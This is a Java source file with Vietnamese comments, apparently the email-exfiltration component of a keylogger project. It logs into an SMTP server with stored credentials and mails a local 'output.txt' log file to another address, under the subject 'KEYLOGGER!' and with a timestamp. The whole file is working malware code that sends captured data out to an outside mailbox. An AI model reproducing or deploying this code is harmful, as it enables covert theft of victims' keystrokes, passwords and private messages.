package Email;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.Properties;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class TextEmail {

	public void SendMail() {

		Properties properties = System.getProperties();

		properties.put("mail.smtp.host", ConstValue.SMTP_HOST);

		// Giao thức SMTP

		properties.put("mail.smtp.port", "465");

		// Gởi mail bằng giao thức SMTP thường sử dụng port 465
		properties.put("mail.smtp.ssl.enable", "true");
		// Đặt Secure Sockets Layer - chuẩn an ninh công nghệ = true
		properties.put("mail.smtp.auth", "true");
		// Cho phép auth bằng lệnh

		// Tạo Session để đăng nhập vào hệ thống gmail
		Session session = Session.getInstance(properties, new javax.mail.Authenticator() {

			@Override
			protected PasswordAuthentication getPasswordAuthentication() {

				return new PasswordAuthentication(ConstValue.MY_EMAIL, ConstValue.MY_PASSWORD);

			}

		});
		try {
			// tạo mime Message sử dụng để gởi mail
			MimeMessage message = new MimeMessage(session);

			// Đặt trường From là địa chỉ người gởi
			message.setFrom(new InternetAddress(ConstValue.MY_EMAIL));

			// Thêm địa chỉ người nhận
			message.addRecipient(Message.RecipientType.TO, new InternetAddress(ConstValue.FRIEND_EMAIL));

			// Tiêu đề Mail
			message.setSubject("KEYLOGGER!");

			// Phần content là Multipart bao gồm attachment, body ...
			Multipart multipart = new MimeMultipart();

			// Tạo attachment để gắn file vào
			MimeBodyPart attachmentPart = new MimeBodyPart();

			// Tạo textpart để cho text vào
			MimeBodyPart textPart = new MimeBodyPart();

			try {

				// Lấy file thả vào
				String pathProject = System.getProperty("user.dir");
				String fileName = pathProject + "\\" + "output.txt";

				File f = new File(fileName);

				// Gắn file vào
				attachmentPart.attachFile(f);
				// Gắn Text vào
				textPart.setText("DU LIEU VAO LUC: " + new Date().toString());
				// Thêm các part vào phong thư
				multipart.addBodyPart(textPart);
				multipart.addBodyPart(attachmentPart);

			} catch (IOException e) {

				e.printStackTrace();

			}
			// Content = multipart đó
			message.setContent(multipart);

			System.out.println("sending...");
			// Gởi mail đi
			Transport.send(message);
			System.out.println("Sent message successfully....");
		} catch (MessagingException mex) {
			mex.printStackTrace();
		}

	}
}
